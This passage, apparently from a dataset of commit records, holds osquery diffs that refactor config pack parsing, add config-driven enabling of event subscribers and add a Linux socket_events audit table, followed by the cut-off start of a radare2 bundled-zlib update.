    \                               std::string(e.what()));\n-            }\n-   \
    \       }\n-        }\n-      }\n-    }\n-\n-    for (const auto& plugin : Registry::all(\"\
    config_parser\")) {\n-      std::shared_ptr<ConfigParserPlugin> parser;\n-   \
    \   try {\n-\tparser = std::dynamic_pointer_cast<ConfigParserPlugin>(plugin.second);\n\
    -      } catch (const std::bad_cast& e) {\n-        LOG(ERROR) << \"Error casting\
    \ config parser plugin: \" << plugin.first;\n-      }\n-      if (parser == nullptr\
    \ || parser.get() == nullptr) {\n-        continue;\n-      }\n-\n-      // For\
    \ each key requested by the parser, add a property tree reference.\n-      std::map<std::string,\
    \ pt::ptree> parser_config;\n-      for (const auto& key : parser->keys()) {\n\
    -        if (tree.count(key) > 0) {\n-          parser_config[key] = tree.get_child(key);\n\
    -        } else {\n-          parser_config[key] = pt::ptree();\n-        }\n\
    -      }\n-\n-      // The config parser plugin will receive a copy of each property\
    \ tree for\n-      // each top-level-config key. The parser may choose to update\
    \ the config's\n-      // internal state\n-      parser->update(parser_config);\n\
    +    auto status = updateSource(source.first, source.second);\n+    if (!status.ok())\
    \ {\n+      return status;\n     }\n   }\n "
  - "--- a/osquery/config/packs.cpp\n+++ b/osquery/config/packs.cpp\n@@ -33,44 +33,6\
    \ @@ FLAG(int32,\n      3600,\n      \"Query interval to use if none is provided\"\
    );\n \n-Pack::Pack(const std::string& name, const pt::ptree& tree) {\n-  initialize(name,\
    \ \"\", tree);\n-}\n-\n-Pack::Pack(const std::string& name,\n-           const\
    \ std::string& source,\n-           const pt::ptree& tree) {\n-  initialize(name,\
    \ source, tree);\n-}\n-\n-Pack::Pack(const std::string& name, const std::string&\
    \ json) {\n-  std::stringstream stream;\n-  stream << json;\n-  pt::ptree tree;\n\
    -  try {\n-    pt::read_json(stream, tree);\n-  } catch (const pt::json_parser::json_parser_error&\
    \ e) {\n-    LOG(ERROR) << \"Error parsing pack JSON. Re-throwing the exception.\"\
    ;\n-    throw;\n-  }\n-  initialize(name, \"\", tree);\n-}\n-\n-Pack::Pack(const\
    \ std::string& name,\n-           const std::string& source,\n-           const\
    \ std::string& json) {\n-  std::stringstream stream;\n-  stream << json;\n-  pt::ptree\
    \ tree;\n-  try {\n-    pt::read_json(stream, tree);\n-  } catch (const pt::json_parser::json_parser_error&\
    \ e) {\n-    LOG(ERROR) << \"Error parsing pack JSON. Re-throwing the exception.\"\
    ;\n-    throw;\n-  }\n-  initialize(name, source, tree);\n-}\n-\n int splayValue(int\
    \ original, int splayPercent) {\n   if (splayPercent <= 0 || splayPercent > 100)\
    \ {\n     return original;\n@@ -109,39 +71,46 @@ void Pack::initialize(const std::string&\
    \ name,\n \n   platform_.clear();\n   if (tree.count(\"platform\") > 0) {\n- \
    \   platform_ = tree.get<std::string>(\"platform\");\n+    platform_ = tree.get<std::string>(\"\
    platform\", \"\");\n   }\n \n   version_.clear();\n   if (tree.count(\"version\"\
    ) > 0) {\n-    version_ = tree.get<std::string>(\"version\");\n+    version_ =\
    \ tree.get<std::string>(\"version\", \"\");\n   }\n \n   schedule_.clear();\n\
    -  if (tree.count(\"queries\") > 0) {\n-    for (const auto& q : tree.get_child(\"\
    queries\")) {\n-      if (q.second.count(\"platform\")) {\n-        if (!checkPlatform(q.second.get<std::string>(\"\
    platform\"))) {\n-          continue;\n-        }\n+  if (tree.count(\"queries\"\
    ) == 0) {\n+    // This pack contained no queries.\n+    return;\n+  }\n+\n+ \
    \ for (const auto& q : tree.get_child(\"queries\")) {\n+    if (q.second.count(\"\
    platform\")) {\n+      if (!checkPlatform(q.second.get<std::string>(\"platform\"\
    , \"\"))) {\n+        continue;\n       }\n+    }\n \n-      if (q.second.count(\"\
    version\")) {\n-        if (!checkVersion(q.second.get<std::string>(\"version\"\
    ))) {\n-          continue;\n-        }\n+    if (q.second.count(\"version\"))\
    \ {\n+      if (!checkVersion(q.second.get<std::string>(\"version\", \"\"))) {\n\
    +        continue;\n       }\n+    }\n \n-      ScheduledQuery query;\n-     \
    \ query.interval =\n-          q.second.get<int>(\"interval\", FLAGS_schedule_default_interval);\n\
    -      query.splayed_interval =\n-          splayValue(query.interval, FLAGS_schedule_splay_percent);\n\
    -      query.query = q.second.get<std::string>(\"query\");\n-      query.options[\"\
    snapshot\"] = q.second.get<bool>(\"snapshot\", false);\n-      query.options[\"\
    removed\"] = q.second.get<bool>(\"removed\", true);\n-      schedule_[q.first]\
    \ = query;\n+    ScheduledQuery query;\n+    query.interval = q.second.get(\"\
    interval\", FLAGS_schedule_default_interval);\n+    query.query = q.second.get<std::string>(\"\
    query\", \"\");\n+    if (query.interval == 0 || query.query.empty()) {\n+   \
    \   // Invalid pack query.\n+      continue;\n     }\n+\n+    query.splayed_interval\
    \ =\n+        splayValue(query.interval, FLAGS_schedule_splay_percent);\n+   \
    \ query.options[\"snapshot\"] = q.second.get<bool>(\"snapshot\", false);\n+  \
    \  query.options[\"removed\"] = q.second.get<bool>(\"removed\", true);\n+    schedule_[q.first]\
    \ = query;\n   }\n }\n "
  - "--- a/osquery/config/parsers/events.cpp\n+++ b/osquery/config/parsers/events.cpp\n\
    @@ -21,10 +21,7 @@ class EventsConfigParserPlugin : public ConfigParserPlugin\
    \ {\n  public:\n   std::vector<std::string> keys() { return {\"events\"}; }\n\
    \ \n-  Status setUp() {\n-    data_.put_child(\"events\", pt::ptree());\n-   \
    \ return Status(0, \"OK\");\n-  }\n+  EventsConfigParserPlugin() { data_.put_child(\"\
    events\", pt::ptree()); }\n \n   Status update(const std::map<std::string, pt::ptree>&\
    \ config) {\n     if (config.count(\"events\") > 0) {"
  - "--- a/osquery/config/parsers/tests/events_tests.cpp\n+++ b/osquery/config/parsers/tests/events_tests.cpp\n\
    @@ -35,7 +35,7 @@ TEST_F(EventsConfigParserPluginTests, test_get_event) {\n \n\
    \   auto plugin = Config::getInstance().getParser(\"events\");\n   EXPECT_TRUE(plugin\
    \ != nullptr);\n-  auto data = plugin->getData();\n+  const auto& data = plugin->getData();\n\
    \ \n   EXPECT_EQ(data.count(\"events\"), 1U);\n   EXPECT_GT(data.get_child(\"\
    events\").count(\"environment_variables\"), 0U);"
  - "--- a/osquery/config/tests/config_tests.cpp\n+++ b/osquery/config/tests/config_tests.cpp\n\
    @@ -10,6 +10,8 @@\n #include <memory>\n #include <vector>\n \n+#include <boost/property_tree/json_parser.hpp>\n\
    +\n #include <gtest/gtest.h>\n \n #include <osquery/config.h>\n@@ -139,7 +141,7\
    \ @@ TEST_F(ConfigTests, test_parse) {\n   auto tree = getExamplePacksConfig();\n\
    \   auto packs = tree.get_child(\"packs\");\n   for (const auto& pack : packs)\
    \ {\n-    c.addPack(Pack(pack.first, pack.second));\n+    c.addPack(pack.first,\
    \ \"\", pack.second);\n   }\n   for (Pack& p : c.schedule_) {\n     EXPECT_TRUE(p.shouldPackExecute());\n\
    @@ -148,7 +150,7 @@ TEST_F(ConfigTests, test_parse) {\n \n TEST_F(ConfigTests,\
    \ test_remove) {\n   auto c = Config();\n-  c.addPack(Pack(\"kernel\", getUnrestrictedPack()));\n\
    +  c.addPack(\"kernel\", \"\", getUnrestrictedPack());\n   c.removePack(\"kernel\"\
    );\n   for (Pack& pack : c.schedule_) {\n     EXPECT_NE(\"kernel\", pack.getName());\n\
    @@ -161,7 +163,7 @@ TEST_F(ConfigTests, test_add_remove_pack) {\n   auto last\
    \ = c.schedule_.end();\n   EXPECT_EQ(std::distance(first, last), 0);\n \n-  c.addPack(Pack(\"\
    kernel\", getUnrestrictedPack()));\n+  c.addPack(\"kernel\", \"\", getUnrestrictedPack());\n\
    \   first = c.schedule_.begin();\n   last = c.schedule_.end();\n   EXPECT_EQ(std::distance(first,\
    \ last), 1);\n@@ -175,7 +177,7 @@ TEST_F(ConfigTests, test_add_remove_pack) {\n\
    \ TEST_F(ConfigTests, test_get_scheduled_queries) {\n   std::vector<ScheduledQuery>\
    \ queries;\n   auto c = Config();\n-  c.addPack(Pack(\"kernel\", getUnrestrictedPack()));\n\
    +  c.addPack(\"kernel\", \"\", getUnrestrictedPack());\n   c.scheduledQueries(\n\
    \       ([&queries](const std::string&, const ScheduledQuery& query) {\n     \
    \    queries.push_back(query);\n@@ -198,7 +200,7 @@ TEST_F(ConfigTests, test_get_parser)\
    \ {\n \n   const auto& parser =\n       std::dynamic_pointer_cast<TestConfigParserPlugin>(plugin);\n\
    -  auto data = parser->getData();\n+  const auto& data = parser->getData();\n\
    \ \n   EXPECT_EQ(data.count(\"list\"), 1U);\n   EXPECT_EQ(data.count(\"dictionary\"\
    ), 1U);"
  - "--- a/osquery/config/tests/packs_tests.cpp\n+++ b/osquery/config/tests/packs_tests.cpp\n\
    @@ -7,6 +7,9 @@\n  *  of patent rights can be found in the PATENTS file in the\
    \ same directory.\n  *\n  */\n+\n+#include <boost/property_tree/json_parser.hpp>\n\
    +\n #include <gtest/gtest.h>\n \n #include <osquery/core.h>\n@@ -123,14 +126,8\
    \ @@ TEST_F(PacksTests, test_schedule) {\n }\n \n TEST_F(PacksTests, test_discovery_cache)\
    \ {\n-  auto pack = Pack(\"kernel\", getPackWithValidDiscovery());\n-  auto& stats\
    \ = pack.getStats();\n-  EXPECT_EQ(stats.total, 0);\n-  EXPECT_EQ(stats.hits,\
    \ 0);\n-  EXPECT_EQ(stats.misses, 0);\n-\n   auto c = Config();\n-  c.addPack(pack);\n\
    +  c.addPack(\"kernel\", \"\", getPackWithValidDiscovery());\n   size_t query_count\
    \ = 0;\n   for (size_t i = 0; i < 5; i++) {\n     c.scheduledQueries("
  - "--- a/osquery/events/darwin/tests/fsevents_tests.cpp\n+++ b/osquery/events/darwin/tests/fsevents_tests.cpp\n\
    @@ -252,7 +252,7 @@ TEST_F(FSEventsTests, test_fsevents_fire_event) {\n \n   //\
    \ Simulate registering an event subscriber.\n   auto sub = std::make_shared<TestFSEventsEventSubscriber>();\n\
    -  auto status = sub->init();\n+  EventFactory::registerEventSubscriber(sub);\n\
    \ \n   // Create a subscriptioning context, note the added Event to the symbol\n\
    \   auto sc = sub->GetSubscription(0);"
  - "--- a/osquery/events/events.cpp\n+++ b/osquery/events/events.cpp\n@@ -14,6 +14,7\
    \ @@\n #include <boost/algorithm/string/classification.hpp>\n #include <boost/lexical_cast.hpp>\n\
    \ \n+#include <osquery/config.h>\n #include <osquery/core.h>\n #include <osquery/events.h>\n\
    \ #include <osquery/flags.h>\n@@ -586,21 +587,49 @@ Status EventFactory::registerEventSubscriber(const\
    \ PluginRef& sub) {\n     return Status(1, \"Invalid subscriber\");\n   }\n \n\
    +  // The config may use an \"events\" key to explicitly enabled or disable\n\
    +  // event subscribers. See EventSubscriber::disable.\n+  auto name = specialized_sub->getName();\n\
    +  auto plugin = Config::getInstance().getParser(\"events\");\n+  if (plugin !=\
    \ nullptr && plugin.get() != nullptr) {\n+    const auto& data = plugin->getData();\n\
    +    // First perform explicit enabling.\n+    if (data.get_child(\"events\").count(\"\
    enable_subscribers\") > 0) {\n+      for (const auto& item : data.get_child(\"\
    events.enable_subscribers\")) {\n+        if (item.second.data() == name) {\n\
    +          VLOG(1) << \"Enabling event subscriber: \" << name;\n+          specialized_sub->disabled\
    \ = false;\n+        }\n+      }\n+    }\n+    // Then use explicit disabling\
    \ as an ultimate override.\n+    if (data.get_child(\"events\").count(\"disable_subscribers\"\
    ) > 0) {\n+      for (const auto& item : data.get_child(\"events.disable_subscribers\"\
    )) {\n+        if (item.second.data() == name) {\n+          VLOG(1) << \"Disabling\
    \ event subscriber: \" << name;\n+          specialized_sub->disabled = true;\n\
    +        }\n+      }\n+    }\n+  }\n+\n   // Let the module initialize any Subscriptions.\n\
    \   auto status = Status(0, \"OK\");\n-  if (!FLAGS_disable_events) {\n+  if (!FLAGS_disable_events\
    \ && !specialized_sub->disabled) {\n     status = specialized_sub->init();\n+\
    \    specialized_sub->state(SUBSCRIBER_RUNNING);\n+  } else {\n+    specialized_sub->state(SUBSCRIBER_PAUSED);\n\
    \   }\n \n   auto& ef = EventFactory::getInstance();\n-  ef.event_subs_[specialized_sub->getName()]\
    \ = specialized_sub;\n+  ef.event_subs_[name] = specialized_sub;\n \n   // Set\
    \ state of subscriber.\n   if (!status.ok()) {\n     specialized_sub->state(SUBSCRIBER_FAILED);\n\
    \     return Status(1, status.getMessage());\n   } else {\n-    specialized_sub->state(SUBSCRIBER_RUNNING);\n\
    \     return Status(0, \"OK\");\n   }\n }\n@@ -728,6 +757,7 @@ void EventFactory::end(bool\
    \ join) {\n \n   // Threads may still be executing, when they finish, release\
    \ publishers.\n   ef.event_pubs_.clear();\n+  ef.event_subs_.clear();\n }\n \n\
    \ void attachEvents() {\n@@ -740,7 +770,7 @@ void attachEvents() {\n   for (const\
    \ auto& subscriber : subscribers) {\n     auto status = EventFactory::registerEventSubscriber(subscriber.second);\n\
    \     if (!status.ok()) {\n-      LOG(ERROR) << \"Error registering subscriber:\
    \ \" << status.getMessage();\n+      LOG(WARNING) << \"Error registering subscriber:\
    \ \" << status.getMessage();\n     }\n   }\n }"
  - "--- a/osquery/events/linux/tests/inotify_tests.cpp\n+++ b/osquery/events/linux/tests/inotify_tests.cpp\n\
    @@ -260,7 +260,7 @@ TEST_F(INotifyTests, test_inotify_fire_event) {\n   // Assume\
    \ event type is registered.\n   StartEventLoop();\n   auto sub = std::make_shared<TestINotifyEventSubscriber>();\n\
    -  sub->init();\n+  EventFactory::registerEventSubscriber(sub);\n \n   // Create\
    \ a subscriptioning context, note the added Event to the symbol\n   auto sc =\
    \ sub->GetSubscription(real_test_path, 0);\n@@ -278,7 +278,7 @@ TEST_F(INotifyTests,\
    \ test_inotify_event_action) {\n   // Assume event type is registered.\n   StartEventLoop();\n\
    \   auto sub = std::make_shared<TestINotifyEventSubscriber>();\n-  sub->init();\n\
    +  EventFactory::registerEventSubscriber(sub);\n \n   auto sc = sub->GetSubscription(real_test_path,\
    \ 0);\n   sub->subscribe(&TestINotifyEventSubscriber::Callback, sc, nullptr);\n\
    @@ -315,7 +315,7 @@ TEST_F(INotifyTests, test_inotify_recursion) {\n   StartEventLoop();\n\
    \ \n   auto sub = std::make_shared<TestINotifyEventSubscriber>();\n-  sub->init();\n\
    +  EventFactory::registerEventSubscriber(sub);\n \n   boost::filesystem::create_directory(real_test_dir);\n\
    \   boost::filesystem::create_directory(real_test_sub_dir);"
  - "--- a/osquery/events/tests/events_database_tests.cpp\n+++ b/osquery/events/tests/events_database_tests.cpp\n\
    @@ -20,18 +20,16 @@\n \n namespace osquery {\n \n-//const std::string kTestingEventsDBPath\
    \ = \"/tmp/rocksdb-osquery-testevents\";\n-\n class EventsDatabaseTests : public\
    \ ::testing::Test {};\n \n-class FakeEventPublisher\n+class DBFakeEventPublisher\n\
    \     : public EventPublisher<SubscriptionContext, EventContext> {\n-  DECLARE_PUBLISHER(\"\
    FakePublisher\");\n+  DECLARE_PUBLISHER(\"DBFakePublisher\");\n };\n \n-class\
    \ FakeEventSubscriber : public EventSubscriber<FakeEventPublisher> {\n+class DBFakeEventSubscriber\
    \ : public EventSubscriber<DBFakeEventPublisher> {\n  public:\n-  FakeEventSubscriber()\
    \ { setName(\"FakeSubscriber\"); }\n+  DBFakeEventSubscriber() { setName(\"DBFakeSubscriber\"\
    ); }\n   /// Add a fake event at time t\n   Status testAdd(int t) {\n     Row\
    \ r;\n@@ -41,7 +39,7 @@ class FakeEventSubscriber : public EventSubscriber<FakeEventPublisher>\
    \ {\n };\n \n TEST_F(EventsDatabaseTests, test_event_module_id) {\n-  auto sub\
    \ = std::make_shared<FakeEventSubscriber>();\n+  auto sub = std::make_shared<DBFakeEventSubscriber>();\n\
    \   sub->doNotExpire();\n \n   // Not normally available outside of EventSubscriber->Add().\n\
    @@ -52,13 +50,13 @@ TEST_F(EventsDatabaseTests, test_event_module_id) {\n }\n\
    \ \n TEST_F(EventsDatabaseTests, test_event_add) {\n-  auto sub = std::make_shared<FakeEventSubscriber>();\n\
    +  auto sub = std::make_shared<DBFakeEventSubscriber>();\n   auto status = sub->testAdd(1);\n\
    \   EXPECT_TRUE(status.ok());\n }\n \n TEST_F(EventsDatabaseTests, test_record_indexing)\
    \ {\n-  auto sub = std::make_shared<FakeEventSubscriber>();\n+  auto sub = std::make_shared<DBFakeEventSubscriber>();\n\
    \   auto status = sub->testAdd(2);\n   status = sub->testAdd(11);\n   status =\
    \ sub->testAdd(61);\n@@ -99,7 +97,7 @@ TEST_F(EventsDatabaseTests, test_record_indexing)\
    \ {\n }\n \n TEST_F(EventsDatabaseTests, test_record_range) {\n-  auto sub = std::make_shared<FakeEventSubscriber>();\n\
    +  auto sub = std::make_shared<DBFakeEventSubscriber>();\n \n   // Search within\
    \ a specific record range.\n   auto indexes = sub->getIndexes(0, 10);\n@@ -124,7\
    \ +122,7 @@ TEST_F(EventsDatabaseTests, test_record_range) {\n }\n \n TEST_F(EventsDatabaseTests,\
    \ test_record_expiration) {\n-  auto sub = std::make_shared<FakeEventSubscriber>();\n\
    +  auto sub = std::make_shared<DBFakeEventSubscriber>();\n \n   // No expiration\n\
    \   auto indexes = sub->getIndexes(0, 5000);"
  - "--- a/osquery/events/tests/events_tests.cpp\n+++ b/osquery/events/tests/events_tests.cpp\n\
    @@ -8,31 +8,19 @@\n  *\n  */\n \n-#include <typeinfo>\n-\n #include <boost/filesystem/operations.hpp>\n\
    \ \n #include <gtest/gtest.h>\n \n #include <osquery/events.h>\n #include <osquery/tables.h>\n\
    \ \n-#include \"osquery/database/db_handle.h\"\n-\n namespace osquery {\n \n-const\
    \ std::string kTestingEventsDBPath = \"/tmp/rocksdb-osquery-testevents\";\n-\n\
    \ class EventsTests : public ::testing::Test {\n  public:\n-  void SetUp() {\n\
    -    // Setup a testing DB instance\n-    DBHandle::getInstanceAtPath(kTestingEventsDBPath);\n\
    -  }\n-\n   void TearDown() {\n-    EventFactory::end();\n-    boost::filesystem::remove_all(osquery::kTestingEventsDBPath);\n\
    +    EventFactory::end(true);\n   }\n };\n \n@@ -364,6 +352,8 @@ TEST_F(EventsTests,\
    \ test_fire_event) {\n   status = EventFactory::registerEventPublisher(pub);\n\
    \ \n   auto sub = std::make_shared<FakeEventSubscriber>();\n+  EventFactory::registerEventSubscriber(sub);\n\
    +\n   auto subscription = Subscription::create(\"FakeSubscriber\");\n   subscription->callback\
    \ = TestTheeCallback;\n   status = EventFactory::addSubscription(\"publisher\"\
    , subscription);\n@@ -407,4 +397,23 @@ TEST_F(EventsTests, test_subscriber_names)\
    \ {\n   EXPECT_EQ(sub->getName(), \"FakeSubscriber\");\n   EXPECT_EQ(sub->dbNamespace(),\
    \ \"FakePublisher.FakeSubscriber\");\n }\n+\n+class DisabledEventSubscriber :\
    \ public EventSubscriber<FakeEventPublisher> {\n+ public:\n+  DisabledEventSubscriber()\
    \ : EventSubscriber(false) {}\n+};\n+\n+TEST_F(EventsTests, test_event_toggle_subscribers)\
    \ {\n+  // Make sure subscribers can disable themselves using the event subscriber\n\
    +  // constructor parameter.\n+  auto sub = std::make_shared<DisabledEventSubscriber>();\n\
    +  EXPECT_TRUE(sub->disabled);\n+  // Normal subscribers will be enabled.\n+ \
    \ auto sub2 = std::make_shared<SubFakeEventSubscriber>();\n+  EXPECT_FALSE(sub2->disabled);\n\
    +\n+  // Registering a disabled subscriber will put it into a paused state.\n\
    +  EventFactory::registerEventSubscriber(sub);\n+  EXPECT_EQ(sub->state(), SUBSCRIBER_PAUSED);\n\
    +}\n }"
  - "--- a/osquery/tables/events/darwin/process_events.cpp\n+++ b/osquery/tables/events/darwin/process_events.cpp\n\
    @@ -75,7 +75,7 @@ Status ProcessEventSubscriber::Callback(\n     if (plugin ==\
    \ nullptr || plugin.get() == nullptr) {\n       LOG(ERROR) << \"Could not load\
    \ events config parser\";\n     } else {\n-      auto data = plugin->getData();\n\
    +      const auto &data = plugin->getData();\n       if (data.get_child(\"events\"\
    ).count(\"environment_variables\") > 0) {\n         use_whitelist = true;\n  \
    \       whitelist = data.get_child(\"events.environment_variables\");"
  - '--- a/osquery/tables/events/linux/socket_events.cpp

    +++ b/osquery/tables/events/linux/socket_events.cpp

    @@ -0,0 +1,101 @@

    +/*

    + *  Copyright (c) 2014, Facebook, Inc.

    + *  All rights reserved.

    + *

    + *  This source code is licensed under the BSD-style license found in the

    + *  LICENSE file in the root directory of this source tree. An additional grant

    + *  of patent rights can be found in the PATENTS file in the same directory.

    + *

    + */

    +

    +#include <osquery/sql.h>

    +

    +#include "osquery/events/linux/audit.h"

    +

    +namespace osquery {

    +

    +#define AUDIT_SYSCALL_BIND 49

    +#define AUDIT_SYSCALL_CONNECT 42

    +

    +// Depend on the external getUptime table method.

    +namespace tables {

    +extern long getUptime();

    +}

    +

    +class SocketEventSubscriber : public EventSubscriber<AuditEventPublisher> {

    + public:

    +  /// Decorating syscall events with socket information on Linux is expensive.

    +  SocketEventSubscriber() : EventSubscriber(false) {}

    +

    +  /// The process event subscriber declares an audit event type subscription.

    +  Status init();

    +

    +  /// Kernel events matching the event type will fire.

    +  Status Callback(const AuditEventContextRef& ec, const void* user_data);

    +};

    +

    +REGISTER(SocketEventSubscriber, "event_subscriber", "socket_events");

    +

    +Status SocketEventSubscriber::init() {

    +  auto sc = createSubscriptionContext();

    +

    +  // Monitor for bind and connect syscalls.

    +  sc->rules.push_back({AUDIT_SYSCALL_BIND, ""});

    +  sc->rules.push_back({AUDIT_SYSCALL_CONNECT, ""});

    +

    +  // Drop events if they are encountered outside of the expected state.

    +  // sc->types = {AUDIT_SYSCALL};

    +  subscribe(&SocketEventSubscriber::Callback, sc, nullptr);

    +

    +  return Status(0, "OK");

    +}

    +

    +Status SocketEventSubscriber::Callback(const AuditEventContextRef& ec,

    +                                       const void* user_data) {

    +  Row r;

    +  r["pid"] = ec->fields["pid"];

    +  r["path"] = ec->fields["exe"];

    +  r["fd"] = ec->fields["a0"];

    +

    +  if (ec->syscall == AUDIT_SYSCALL_CONNECT) {

    +    r["action"] = "connect";

    +    // The connect syscall must exit with EINPROGRESS

    +    if (ec->fields.count("exit") && ec->fields.at("exit") != "-115") {

    +      return Status(0, "Not recording socket event");

    +    }

    +

    +  } else if (ec->syscall == AUDIT_SYSCALL_BIND) {

    +    r["action"] = "bind";

    +  }

    +

    +  // The open/bind success status.

    +  r["success"] = (ec->fields["success"] == "yes") ? "1" : "0";

    +

    +  auto qd = SQL::selectAllFrom("process_open_sockets", "pid", EQUALS, r["pid"]);

    +  for (const auto& row : qd) {

    +    if (row.at("fd") == r["fd"]) {

    +      // For the socket event that happens before a bind.

    +      if (row.at("socket").empty()) {

    +        return Status(0, "No socket information");

    +      }

    +

    +      r["socket"] = row.at("socket");

    +      r["family"] = row.at("family");

    +      r["protocol"] = row.at("protocol");

    +      r["remote_address"] = row.at("remote_address");

    +      r["local_address"] = row.at("local_address");

    +      r["remote_port"] = row.at("remote_port");

    +      r["local_port"] = row.at("local_port");

    +      break;

    +    }

    +  }

    +

    +  if (r.count("socket") == 0) {

    +    return Status(0, "No socket found");

    +  }

    +

    +  r["uptime"] = std::to_string(tables::getUptime());

    +  add(r, getUnixTime());

    +  return Status(0, "OK");

    +}

    +} // namespace osquery'
  - "--- a/osquery/tables/events/yara_events.cpp\n+++ b/osquery/tables/events/yara_events.cpp\n\
    @@ -157,8 +157,7 @@ Status YARAEventSubscriber::Callback(const FileEventContextRef&\
    \ ec,\n   // Use the category as a lookup into the yara file_paths. The value\
    \ will be\n   // a list of signature groups to scan with.\n   auto category =\
    \ r.at(\"category\");\n-  pt::ptree yara_config;\n-  yara_config = parser->getData();\n\
    +  const auto& yara_config = parser->getData();\n   const auto& yara_paths = yara_config.get_child(\"\
    file_paths\");\n   const auto& sig_groups = yara_paths.find(category);\n   for\
    \ (const auto& rule : sig_groups->second) {"
  - "--- a/osquery/tables/networking/linux/process_open_sockets.cpp\n+++ b/osquery/tables/networking/linux/process_open_sockets.cpp\n\
    @@ -14,7 +14,6 @@\n \n #include <osquery/core.h>\n #include <osquery/filesystem.h>\n\
    -#include <osquery/logger.h>\n #include <osquery/tables.h>\n \n namespace osquery\
    \ {\n@@ -29,6 +28,9 @@ const std::map<int, std::string> kLinuxProtocolNames =\
    \ {\n     {IPPROTO_RAW, \"raw\"},\n };\n \n+// A map of socket handles (inodes)\
    \ to their pid and file descriptor.\n+typedef std::map<std::string, std::pair<std::string,\
    \ std::string> > InodeMap;\n+\n std::string addressFromHex(const std::string &encoded_address,\
    \ int family) {\n   char addr_buffer[INET6_ADDRSTRLEN] = {0};\n   if (family ==\
    \ AF_INET) {\n@@ -50,7 +52,7 @@ std::string addressFromHex(const std::string &encoded_address,\
    \ int family) {\n     }\n   }\n \n-  return TEXT(addr_buffer);\n+  return std::string(addr_buffer);\n\
    \ }\n \n unsigned short portFromHex(const std::string &encoded_port) {\n@@ -61,7\
    \ +63,7 @@ unsigned short portFromHex(const std::string &encoded_port) {\n   return\
    \ decoded;\n }\n \n-void genSocketsFromProc(const std::map<std::string, std::string>\
    \ &inodes,\n+void genSocketsFromProc(const InodeMap &inodes,\n               \
    \          int protocol,\n                         int family,\n             \
    \            QueryData &results) {\n@@ -133,9 +135,11 @@ void genSocketsFromProc(const\
    \ std::map<std::string, std::string> &inodes,\n     }\n \n     if (inodes.count(r[\"\
    socket\"]) > 0) {\n-      r[\"pid\"] = inodes.at(r[\"socket\"]);\n+      r[\"\
    pid\"] = inodes.at(r[\"socket\"]).second;\n+      r[\"fd\"] = inodes.at(r[\"socket\"\
    ]).first;\n     } else {\n       r[\"pid\"] = \"-1\";\n+      r[\"fd\"] = \"-1\"\
    ;\n     }\n \n     results.push_back(r);\n@@ -154,15 +158,16 @@ QueryData genOpenSockets(QueryContext\
    \ &context) {\n   }\n \n   // Generate a map of socket inode to process tid.\n\
    -  std::map<std::string, std::string> socket_inodes;\n+  InodeMap socket_inodes;\n\
    \   for (const auto &process : pids) {\n     std::map<std::string, std::string>\
    \ descriptors;\n     if (osquery::procDescriptors(process, descriptors).ok())\
    \ {\n       for (const auto& fd : descriptors) {\n         if (fd.second.find(\"\
    socket:[\") == 0) {\n           // See #792: std::regex is incomplete until GCC\
    \ 4.9 (skip 8 chars)\n           auto inode = fd.second.substr(8);\n-        \
    \  socket_inodes[inode.substr(0, inode.size() - 1)] = process;\n+          socket_inodes[inode.substr(0,\
    \ inode.size() - 1)] =\n+              std::make_pair(fd.first, process);\n  \
    \       }\n       }\n     }"
  - "--- a/osquery/tables/system/darwin/process_open_descriptors.cpp\n+++ b/osquery/tables/system/darwin/process_open_descriptors.cpp\n\
    @@ -108,7 +108,8 @@ void genSocketDescriptor(int pid, int descriptor, QueryData\
    \ &results) {\n     Row r;\n \n     r[\"pid\"] = INTEGER(pid);\n-    r[\"socket\"\
    ] = INTEGER(descriptor);\n+    r[\"fd\"] = BIGINT(descriptor);\n+    r[\"socket\"\
    ] = BIGINT(si.psi.soi_so);\n     r[\"path\"] = \"\";\n \n     // Darwin/OSX SOCKINFO_TCP\
    \ is not IPPROTO_TCP"
  commit_message: 'This refactors a bit of config/packs and adds a socket_events table
    to Linux.


    The refactor of config/packs was initiated because event subscribers needed

    a method for toggling `::init` based on some configurable option. In the case

    of auditd, turning on the support with `--disable_audit=false` used to start

    auditing the EXECVE syscall. It was understandable that this would cause

    latency based on the number of processes executing per measure of time.


    A new `socket_events` table will do the same but for `bind` and `connect`. These

    are less-obvious and for now, require a scan of /proc for socket tuples. In the

    future this file descriptor to socket tuple will be faster.'
  commit_sha: b81b6de6ae3f957bfbeca68be72ed0a295a1ba34
  repo_name: osquery/osquery
- commit_diff:
  - "--- a/shlr/zip/zlib/compress.c\n+++ b/shlr/zip/zlib/compress.c\n@@ -26,7 +26,7\
    \ @@ int ZEXPORT compress2 (dest, destLen, source, sourceLen, level)\n     uLong\
    \ sourceLen;\n     int level;\n {\n-    z_stream stream = {0};\n+    z_stream\
    \ stream;\n     int err;\n     const uInt max = (uInt)-1;\n     uLong left;\n\
    @@ -45,7 +45,6 @@ int ZEXPORT compress2 (dest, destLen, source, sourceLen, level)\n\
    \     stream.avail_out = 0;\n     stream.next_in = (z_const Bytef *)source;\n\
    \     stream.avail_in = 0;\n-    stream.total_out = 0;\n \n     do {\n       \
    \  if (stream.avail_out == 0) {"
  - "--- a/shlr/zip/zlib/crc32.c\n+++ b/shlr/zip/zlib/crc32.c\n@@ -1,24 +1,23 @@\n\
    \ /* crc32.c -- compute the CRC-32 of a data stream\n- * Copyright (C) 1995-2006,\
    \ 2010, 2011, 2012, 2016 Mark Adler\n+ * Copyright (C) 1995-2022 Mark Adler\n\
    \  * For conditions of distribution and use, see copyright notice in zlib.h\n\
    \  *\n- * Thanks to Rodney Brown <rbrown64@csc.com.au> for his contribution of\
    \ faster\n- * CRC methods: exclusive-oring 32 bits of data at a time, and pre-computing\n\
    - * tables for updating the shift register in one step with three exclusive-ors\n\
    - * instead of four steps with four exclusive-ors.  This results in about a\n\
    - * factor of two increase in speed on a Power PC G4 (PPC7455) using gcc -O3.\n\
    + * This interleaved implementation of a CRC makes use of pipelined multiple\n\
    + * arithmetic-logic units, commonly found in modern CPU cores. It is due to\n\
    + * Kadatch and Jenkins (2010). See doc/crc-doc.1.0.pdf in this distribution.\n\
    \  */\n \n /* @(#) $Id$ */\n \n /*\n   Note on the use of DYNAMIC_CRC_TABLE: there\
    \ is no mutex or semaphore\n   protection on the static variables used to control\
    \ the first-use generation\n-  of the crc tables.  Therefore, if you #define DYNAMIC_CRC_TABLE,\
    \ you should\n+  of the crc tables. Therefore, if you #define DYNAMIC_CRC_TABLE,\
    \ you should\n   first call get_crc_table() to initialize the tables before allowing\
    \ more than\n   one thread to use crc32().\n \n-  DYNAMIC_CRC_TABLE and MAKECRCH\
